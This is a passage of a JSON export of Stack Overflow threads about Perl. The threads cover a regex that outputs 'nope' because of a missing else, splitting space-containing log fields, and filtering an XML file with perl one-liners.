code block because it&#39;s in <code>{}</code>. In this case, it checks the <code>if</code> statement condition, runs the code block if it evaluates to true, then, runs the next code block (bare block as @Grinnz mentioned). It&#39;s equivalent to a loop that runs once."}, {"owner": {"reputation": 18299, "user_id": 2191572, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/TWbVr.png?s=128&g=1", "display_name": "MonkeyZeus", "link": "https://stackoverflow.com/users/2191572/monkeyzeus"}, "reply_to_user": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1574799445, "post_id": 59058634, "comment_id": 104356877, "body": "@Grinnz So wouldn&#39;t OP see a possible <code>match</code> followed by a guaranteed <code>nope</code>? This of course assumes that OP didn&#39;t leave out any details from their testing..."}, {"owner": {"reputation": 19159, "user_id": 3600709, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/731c8c4c0029d3414563333de16b8977?s=128&d=identicon&r=PG&f=1", "display_name": "ctwheels", "link": "https://stackoverflow.com/users/3600709/ctwheels"}, "reply_to_user": {"reputation": 18299, "user_id": 2191572, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/TWbVr.png?s=128&g=1", "display_name": "MonkeyZeus", "link": "https://stackoverflow.com/users/2191572/monkeyzeus"}, "edited": false, "score": 0, "creation_date": 1574799511, "post_id": 59058634, "comment_id": 104356912, "body": "@MonkeyZeus that&#39;s exactly what I get when I set <code>$html = &quot;data-src-hq&quot;;</code>"}, {"owner": {"reputation": 18299, "user_id": 2191572, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/TWbVr.png?s=128&g=1", "display_name": "MonkeyZeus", "link": "https://stackoverflow.com/users/2191572/monkeyzeus"}, "edited": false, "score": 0, "creation_date": 1574799914, "post_id": 59058634, "comment_id": 104357082, "body": "@Caractacus If you&#39;re just starting to learn regex then head over to <a href=\"https://regex101.com/\" rel=\"nofollow noreferrer\">regex101.com</a> and test things out using the PCRE (Perl Compatible Regular Expressions) option. Whatever regex you write should be directly transferable to the right side of <code>=~</code>. If you get stuck then cliick on &quot;Code Generator&quot; and the site will show you a sample of Perl code."}, {"owner": {"reputation": 4524, "user_id": 8893864, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-mfBb3bzlcfw/AAAAAAAAAAI/AAAAAAAAADM/vILdjUEHHM8/photo.jpg?sz=128", "display_name": "Holli", "link": "https://stackoverflow.com/users/8893864/holli"}, "edited": false, "score": 0, "creation_date": 1574801040, "post_id": 59058634, "comment_id": 104357575, "body": "<a href=\"https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags/1732454\" title=\"regex match open tags except xhtml self contained tags\">stackoverflow.com/questions/1732348/&hellip;</a>"}, {"owner": {"reputation": 73, "user_id": 12440287, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a203193c7f335d9f1e8053ae78711cd?s=128&d=identicon&r=PG&f=1", "display_name": "Caractacus", "link": "https://stackoverflow.com/users/12440287/caractacus"}, "edited": false, "score": 0, "creation_date": 1574883596, "post_id": 59058634, "comment_id": 104391891, "body": "Honestly that was a typo, fixed the OP"}, {"owner": {"reputation": 73, "user_id": 12440287, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a203193c7f335d9f1e8053ae78711cd?s=128&d=identicon&r=PG&f=1", "display_name": "Caractacus", "link": "https://stackoverflow.com/users/12440287/caractacus"}, "reply_to_user": {"reputation": 18299, "user_id": 2191572, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/TWbVr.png?s=128&g=1", "display_name": "MonkeyZeus", "link": "https://stackoverflow.com/users/2191572/monkeyzeus"}, "edited": false, "score": 0, "creation_date": 1575175719, "post_id": 59058634, "comment_id": 104474609, "body": "@MonkeyZeus Thanks for that site. It appears what I got from downloading the page versus viewing the source via the browser were not the exact same results.  Hence the lack of matching.  Am I able to close this question ?"}], "answers": [{"tags": [], "owner": {"reputation": 19159, "user_id": 3600709, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/731c8c4c0029d3414563333de16b8977?s=128&d=identicon&r=PG&f=1", "display_name": "ctwheels", "link": "https://stackoverflow.com/users/3600709/ctwheels"}, "is_accepted": false, "score": 2, "last_activity_date": 1574799867, "creation_date": 1574799867, "answer_id": 59058829, "question_id": 59058634, "link": "https://stackoverflow.com/questions/59058634/having-a-problem-with-multiple-hyphens-in-a-multistring-regex-match-in-perl/59058829#59058829", "title": "Having a problem with multiple hyphens in a multistring regex match in Perl", "body": "<h3>How to fix this?</h3>\n\n<p>You are likely getting two outputs, one of <code>match</code> and one of <code>nope</code>. Your code is missing the keyword <code>else</code>:</p>\n\n<p><a href=\"https://tio.run/##K0gtyjH9/18loyQ3R8FWQSklsSRRt7goWTejUMmaKzNNAypTp6CPJKWfWZyryVXNpaBQUJSZV6KglJtYkpwRkwfUUoskmpdfkAoR/P8fAA\" rel=\"nofollow noreferrer\">See your code's current execution here</a></p>\n\n<pre><code>if($html =~ /data-src-hq/ism)\n{\n  print \"match\\n\";\n}\n{\n  print \"nope\\n\";\n}\n</code></pre>\n\n<p>Should be:</p>\n\n<p><a href=\"https://tio.run/##K0gtyjH9/18loyQ3R8FWQSklsSRRt7goWTejUMmaKzNNAypTp6CPJKWfWZyryVXNpaBQUJSZV6KglJtYkpwRkwfUUquQmlOcqoAkl5dfkAqR@v8fAA\" rel=\"nofollow noreferrer\">See this code's execution here</a></p>\n\n<pre><code>if($html =~ /data-src-hq/ism)\n{\n  print \"match\\n\";\n}\nelse {\n  print \"nope\\n\";\n}\n</code></pre>\n\n<p>Otherwise, your code is fine and works to identify whether <code>data-src-hq</code> exists in <code>$html</code>.</p>\n\n<hr>\n\n<h3>So why does your existing code output <code>nope</code>?</h3>\n\n<p>That's because <code>{}</code> is a basic block (see Basic BLOCKs in <a href=\"https://perldoc.perl.org/perlsyn.html#Declarations\" rel=\"nofollow noreferrer\">Perl's documentation</a>). An excerpt from the documentation:</p>\n\n<blockquote>\n  <p>A BLOCK by itself (labeled or not) is semantically equivalent to a\n  loop that executes once. Thus you can use any of the loop control\n  statements in it to leave or restart the block. (Note that this is NOT\n  true in <code>eval{}</code>, <code>sub{}</code>, or contrary to popular belief <code>do{}</code> blocks,\n  which do NOT count as loops.) The <code>continue</code> block is optional.</p>\n</blockquote>\n"}], "owner": {"reputation": 73, "user_id": 12440287, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a203193c7f335d9f1e8053ae78711cd?s=128&d=identicon&r=PG&f=1", "display_name": "Caractacus", "link": "https://stackoverflow.com/users/12440287/caractacus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 53, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1574883563, "creation_date": 1574798817, "last_edit_date": 1574883563, "question_id": 59058634, "link": "https://stackoverflow.com/questions/59058634/having-a-problem-with-multiple-hyphens-in-a-multistring-regex-match-in-perl", "title": "Having a problem with multiple hyphens in a multistring regex match in Perl", "body": "<p>I am downloading a webpage and converting into a string using LWP::Simple. When I copy the results into an editor I find multiple instances of the pattern I'm looking for \"data-src-hq\".</p>\n\n<p>While I'm trying to do something more complex using regex I am starting in baby steps so I can properly learn how to use regex, I started off with just to match \"data-src-hq\" with the following code:</p>\n\n<pre><code>    if($html =~ /data-src-hq/ism)\n    {\n      print \"match\\n\";\n    }\n    else\n    {\n      print \"nope\\n\";\n    }\n</code></pre>\n\n<p>My code returns \"nope\".  However, if I modify the pattern search to just \"data\" or \"data-src\" I do get a match. The same happens no matter how I use and combine the string and multiline modifier.</p>\n\n<p>My understanding is that a hyphen is not a special character unless it's within brackets, am I missing something simple?</p>\n"}, {"tags": ["perl", "file-io", "split"], "comments": [{"owner": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574756110, "post_id": 59046303, "comment_id": 104333913, "body": "@zdim <code>Main Affected objects</code> and <code>Text</code> will always have spaces in the values of their fields."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1574756140, "post_id": 59046303, "comment_id": 104333924, "body": "And how will they be separated?"}, {"owner": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1574756322, "post_id": 59046303, "comment_id": 104334008, "body": "@choroba space or semicolon."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1574764605, "post_id": 59046303, "comment_id": 104338465, "body": "If they are separated by spaces and contain spaces, how can you recognise where the border is?"}, {"owner": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1574766546, "post_id": 59046303, "comment_id": 104339580, "body": "@choroba I came to know that <code>Main Affected objects</code> and <code>Text</code> will be separated with the semicolon(<code>;</code>)."}], "answers": [{"comments": [{"owner": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "edited": false, "score": 0, "creation_date": 1574760903, "post_id": 59047605, "comment_id": 104336257, "body": "This answer is helpful. Can you please elaborate what does expressions means in <code>qr&#47;...&#47;x;</code> and what is mean by (<code>\\%+</code>) while printing a dumper."}], "tags": [], "owner": {"reputation": 4524, "user_id": 8893864, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-mfBb3bzlcfw/AAAAAAAAAAI/AAAAAAAAADM/vILdjUEHHM8/photo.jpg?sz=128", "display_name": "Holli", "link": "https://stackoverflow.com/users/8893864/holli"}, "is_accepted": false, "score": 2, "last_activity_date": 1574762534, "last_edit_date": 1574762534, "creation_date": 1574760324, "answer_id": 59047605, "question_id": 59046303, "link": "https://stackoverflow.com/questions/59046303/perl-file-reading-have-issue-while-splitting-it-as-space/59047605#59047605", "title": "Perl file reading have issue while splitting it as space", "body": "<blockquote>\n  <p><strong>When in doubt, use a Regex.</strong><br>\n   -- Benedict IX</p>\n</blockquote>\n\n<pre><code>my @data = &lt;DATA&gt; ;\n\nmy $matcher = qr/\n    ^ (?&lt;id&gt;(?&amp;token_id))            (?&amp;splitter) \n      (?&lt;mem_id&gt;(?&amp;token_id))        (?&amp;splitter)\n      (?&lt;date&gt;(?&amp;token_date))        (?&amp;splitter)     \n      (?&lt;priority&gt;(?&amp;token_prio))    (?&amp;splitter)     \n      (?&lt;affected&gt;(?&amp;token_objects)) (?&amp;splitter)     \n      (?&lt;text&gt;(?&amp;token_rest_of_line))\n\n    (?(DEFINE)\n        (?&lt;splitter&gt;   \\x20        )   # blank\n        (?&lt;token_id&gt;   \\d++        )         \n        (?&lt;token_date&gt; [0-9]{4} - [0-9]{2} - [0-9]{2} T [0-9]{2} : [0-9]{2} : [0-9]{2} )\n        (?&lt;token_prio&gt; HI|LOW )\n        (?&lt;token_objects&gt; [^;]++ ; ) # you can get more complex here if needed\n        (?&lt;token_rest_of_line&gt; .+ $ )\n    )\n/x;\n\nforeach my $data_line ( @data ){\n    chomp $data_line;\n    if( $data_line =~ $matcher ) {\n        print Dumper( \\%+ );\n        # $VAR1 = {\n        #   'affected' =&gt; 'val/s1 val/s0;',\n        #   'priority' =&gt; 'LOW',\n        #   'mem_id' =&gt; '1',\n        #   'id' =&gt; '1',\n        #   'date' =&gt; '2018-07-30T07:40:23',\n        #   'text' =&gt; 'Temperature exceded the limit'\n        # };\n    }\n}\n\n__DATA__\n.............\n.............\n.............\n========================================================\nId Mem-Id Date &amp; Time (+00:00) Priority Main Affected objects Text\n========================================================\n1 1 2018-07-30T07:40:23 LOW val/s1 val/s0; Temperature exceded the limit\n======================================================== \n............\n............\n</code></pre>\n\n<p><strong>Edit:</strong></p>\n\n<p>For more information please refer to <a href=\"https://perldoc.perl.org/perlretut.html\" rel=\"nofollow noreferrer\">perlretut</a>, esp. the parts about <a href=\"https://perldoc.perl.org/perlretut.html#Named-backreferences\" rel=\"nofollow noreferrer\">named captures</a> and <a href=\"https://perldoc.perl.org/perlretut.html#Defining-named-patterns\" rel=\"nofollow noreferrer\">named patterns</a>.</p>\n\n<p>Also if interest: Damian the Great on why <a href=\"https://www.youtube.com/watch?v=ubvSjW6Nyqk\" rel=\"nofollow noreferrer\">everything you knew about regular expressions is wrong</a>.</p>\n"}, {"comments": [{"owner": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "edited": false, "score": 0, "creation_date": 1574772642, "post_id": 59050645, "comment_id": 104342767, "body": "Thanks @Dave. This is most simplest logic. Thank you very much."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 4, "last_activity_date": 1574788054, "last_edit_date": 1574788054, "creation_date": 1574770034, "answer_id": 59050645, "question_id": 59046303, "link": "https://stackoverflow.com/questions/59046303/perl-file-reading-have-issue-while-splitting-it-as-space/59050645#59050645", "title": "Perl file reading have issue while splitting it as space", "body": "<p>I'm a big fan of keeping things as simple as possible. I think you can do this with two calls to <code>split()</code>.</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse feature 'say';\n\nwhile (&lt;DATA&gt;) {\n  # Split 1: split the text column off by looking for the semi-colon\n  my ($rest, $text) = split /;\\s*/;\n  # Split 2: split the rest of the data on whitespace. But use a split \n  # limit (5) to stop the affected objects from being split apart.\n  my ($id, $mem_id, $datetime, $priority, $affected) = split /\\s+/, $rest, 5;\n\n  say join ' | ', $id, $mem_id, $datetime, $priority, $affected, $text;\n}\n\n__DATA__\n1 1 2018-07-30T07:40:23 LOW val/s1 val/s0; Temperature exceded the limit\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>1 | 1 | 2018-07-30T07:40:23 | LOW | val/s1 val/s0 | Temperature exceded the limit\n</code></pre>\n"}], "owner": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 77, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1574788054, "creation_date": 1574755568, "question_id": 59046303, "link": "https://stackoverflow.com/questions/59046303/perl-file-reading-have-issue-while-splitting-it-as-space", "title": "Perl file reading have issue while splitting it as space", "body": "<p>I am reading data from a input file and if the line have <code>Date</code> in it then whole line need to be taken out and processed. Here in my example <code>Mem-Id</code> is unique value and I want to create a hash with <code>Mem-Id</code> as a key. As per the data here is the equivalent values for each fields</p>\n\n<pre><code>Id -&gt; 1\nMem-Id -&gt; 1\nDate &amp; Time (+00:00) -&gt; 2018-07-30T07:40:23\nPriority -&gt; LOW\nMain Affected objects -&gt; val/s1 val/s0;\nText -&gt; Temperature exceded the limit\n</code></pre>\n\n<p>Here is my code:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse Data::Dumper;\n\nmy @data = &lt;DATA&gt; ;\n\nforeach my $data_line ( @data ){\n    chomp $data_line;\n    if( $data_line =~ m/[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}/){\n        my ($id, $mem_id, $date_time, $priority, $affected_obj, $text) = split(/\\s+/, $data_line);\n        print \"$id, $mem_id, $date_time, $priority, $affected_obj, $text\\n\";\n    }\n}\n\n__DATA__\n.............\n.............\n.............\n========================================================\nId Mem-Id Date &amp; Time (+00:00) Priority Main Affected objects Text\n========================================================\n1 1 2018-07-30T07:40:23 LOW val/s1 val/s0; Temperature exceded the limit\n======================================================== \n............\n............\n</code></pre>\n\n<p>When I execute the above script I get following output which is wrong:</p>\n\n<pre><code>1, 1, 2018-07-30T07:40:23, LOW, val/s1, val/s0;\n</code></pre>\n\n<p>Since there is a space in values of <code>Main Affected objects</code>, its been taken as separate values and assigned to <code>$affected_obj</code> and <code>$text</code> variables.</p>\n\n<p>How can I assign values to <code>$affected_obj</code> and <code>$text</code> while splitting data line with spaces.</p>\n\n<pre><code>Main Affected objects = val/s1 val/s0;\nText = Temperature exceded the limit\n</code></pre>\n"}, {"tags": ["xml", "perl"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574745280, "post_id": 59043751, "comment_id": 104330086, "body": "How do you decide to keep <code>&lt;normal_concentrations&gt;</code> node?  By the stated criteria and shown data shouldn&#39;t the <code>&lt;concentration&gt;</code> node suffice?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574746194, "post_id": 59043751, "comment_id": 104330329, "body": "It&#39;s nice how you condensed the sample file but I expect that there are _all_kinds of many many names of nodes to skip, which you don&#39;t know.  Do you know the names of all nodes you wish to keep? (Or is it really simply <code>&lt;normal_concentrations&gt;</code> and that&#39;s it?)"}, {"owner": {"reputation": 5, "user_id": 11786915, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FrUR9oR7La0/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdNF1ly4lY2uNg7ETyTH6rwvkw_zg/photo.jpg?sz=128", "display_name": "PCs", "link": "https://stackoverflow.com/users/11786915/pcs"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574747707, "post_id": 59043751, "comment_id": 104330781, "body": "Hey, thank you for the response, yes, I need to keep the normal_concentrations tag, and in this tag, there has 3 more tags and values need to keep, &quot;concentration_value, subject_age and subject_sex&quot;, the rest can all be removed, but there has many &quot;concentration&quot; tags in each &quot;metabolite&quot; tags, I need to keep all of the &quot;concentration&quot; tags in different &quot;metabolite&quot; tags."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574748747, "post_id": 59043751, "comment_id": 104331095, "body": "OK.  But when you say &quot;<i>need to keep all of the &quot;concentration&quot; tags in different &quot;metabolite&quot; tags</i>&quot; then don&#39;t you need to keep <code>metabolite</code> nodes as well? (As a structure, even if all subnodes other than <code>concentration</code> are removed.)  The desired outcome doesn&#39;t show it."}, {"owner": {"reputation": 5, "user_id": 11786915, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FrUR9oR7La0/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdNF1ly4lY2uNg7ETyTH6rwvkw_zg/photo.jpg?sz=128", "display_name": "PCs", "link": "https://stackoverflow.com/users/11786915/pcs"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574749514, "post_id": 59043751, "comment_id": 104331349, "body": "oh, yes! you are right, really appreciate it ! I need to keep the metabolite tags also, sorry for confuse you, I edit the question now :)"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574749679, "post_id": 59043751, "comment_id": 104331395, "body": "OK.  Next question -- can any of these nodes (say one <code>metabolite</code> node) be too big to keep in memory?  There are ways to read XML in small chunks but it helps processing if one can read a subtree (so <code>metabolite</code> node and everything below it) ... but can that be too big?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574749742, "post_id": 59043751, "comment_id": 104331415, "body": "Thanks for update, it triggers another question: so do you keep <code>metabolite</code> nodes even if there&#39;s no <code>concentration</code> nodes inside them?  (That&#39;s how it looks from the eidt.)"}, {"owner": {"reputation": 5, "user_id": 11786915, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FrUR9oR7La0/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdNF1ly4lY2uNg7ETyTH6rwvkw_zg/photo.jpg?sz=128", "display_name": "PCs", "link": "https://stackoverflow.com/users/11786915/pcs"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574751472, "post_id": 59043751, "comment_id": 104332004, "body": "for the memory question, I have to filter out the xml file first and test on my computer, if it is still not able to run, maybe I have to separate it into different small xml files"}, {"owner": {"reputation": 5, "user_id": 11786915, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FrUR9oR7La0/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdNF1ly4lY2uNg7ETyTH6rwvkw_zg/photo.jpg?sz=128", "display_name": "PCs", "link": "https://stackoverflow.com/users/11786915/pcs"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574751525, "post_id": 59043751, "comment_id": 104332025, "body": "for the second question, if possible, all the tags without values should be removed, it can reduce the size of the xml file. thank you so much :)"}, {"owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "edited": false, "score": 0, "creation_date": 1574755516, "post_id": 59043751, "comment_id": 104333632, "body": "You could pass the file through grep filter <code>egrep -v useless_information [filename]  &gt; [newfile]</code>. With provided structure of the file you will be removing <code>useless_information</code> lines from the file."}], "answers": [{"comments": [{"owner": {"reputation": 5, "user_id": 11786915, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FrUR9oR7La0/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdNF1ly4lY2uNg7ETyTH6rwvkw_zg/photo.jpg?sz=128", "display_name": "PCs", "link": "https://stackoverflow.com/users/11786915/pcs"}, "edited": false, "score": 0, "creation_date": 1574749127, "post_id": 59043987, "comment_id": 104331220, "body": "Thank you for the response, here&#39;s the new update, I modified your code a bit and achieve the expected result! Thank you so much! but I realized there has a lot of &quot;&lt;concentration&gt;&quot; tags without any value, may I know how to remove those empty \u201c&lt;concentration&gt;\u201d tags?? once again, thank you so much for the help!!! :)"}, {"owner": {"reputation": 514, "user_id": 3477493, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/81be5771e545ed8340740b38d4c7edba?s=128&d=identicon&r=PG&f=1", "display_name": "user3477493", "link": "https://stackoverflow.com/users/3477493/user3477493"}, "reply_to_user": {"reputation": 5, "user_id": 11786915, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FrUR9oR7La0/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdNF1ly4lY2uNg7ETyTH6rwvkw_zg/photo.jpg?sz=128", "display_name": "PCs", "link": "https://stackoverflow.com/users/11786915/pcs"}, "edited": false, "score": 0, "creation_date": 1575563633, "post_id": 59043987, "comment_id": 104616929, "body": "Would it be helpful to be able to eliminate only those concentration tags that have their mates (&quot;&lt;/concentration&gt;&quot;) on the same line? If so, that is easy to do."}], "tags": [], "owner": {"reputation": 514, "user_id": 3477493, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/81be5771e545ed8340740b38d4c7edba?s=128&d=identicon&r=PG&f=1", "display_name": "user3477493", "link": "https://stackoverflow.com/users/3477493/user3477493"}, "is_accepted": true, "score": 2, "last_activity_date": 1574744628, "last_edit_date": 1574744628, "creation_date": 1574744135, "answer_id": 59043987, "question_id": 59043751, "link": "https://stackoverflow.com/questions/59043751/how-to-use-perl-to-filter-xml-file-with-tags/59043987#59043987", "title": "How to use perl to filter XML file with tags?", "body": "<p>Assuming the sample of your data you have is representative (that is, all the matching tags for useless_information are on the same line) and assuming your input data is in a file called input-data.xml, the following one line perl program should work. I tested it with your sample. So at the bash (or for windows, cmd.exe) command line type this</p>\n\n<pre><code>perl -nle 'while(&lt;stdin&gt;){if(!/useless_information/){chop; print}}' &lt;input-data.xml &gt;output-data.xml\n</code></pre>\n\n<p>This little one line program will ignore any line that contains \"useless_information\" and assumes that matching tag for is always on the same line.</p>\n\n<p>However, since I suspect that there may be several useless tags you want to ignore, it might be more effective to filter for what you want instead of what you don't want.</p>\n\n<pre><code>perl -nle 'while(&lt;stdin&gt;){if(/metobolite|normal_concentrations|concentration_value|subject_age|subject_sex|concentration/){chop; print}}' &lt;input-data.xml &gt;output-data.xml\n</code></pre>\n\n<p>This also assumes that you have perl installed and it (the executable for perl) is in your environment variable called \"PATH\".</p>\n\n<p>Now if you find out that sometimes it (the matching tag) is not on the same line, then we will have to get a little fancier.</p>\n\n<p>HTH!</p>\n"}, {"tags": [], "owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "is_accepted": false, "score": 0, "last_activity_date": 1574753551, "creation_date": 1574753551, "answer_id": 59045823, "question_id": 59043751, "link": "https://stackoverflow.com/questions/59043751/how-to-use-perl-to-filter-xml-file-with-tags/59045823#59045823", "title": "How to use perl to filter XML file with tags?", "body": "<blockquote>\n  <p>file contains too many useless data that need to be filtered</p>\n</blockquote>\n\n<p><a href=\"http://p3rl.org/xml_grep\" rel=\"nofollow noreferrer\">http://p3rl.org/xml_grep</a></p>\n"}], "owner": {"reputation": 5, "user_id": 11786915, "user_type": "registered", "profile_image": 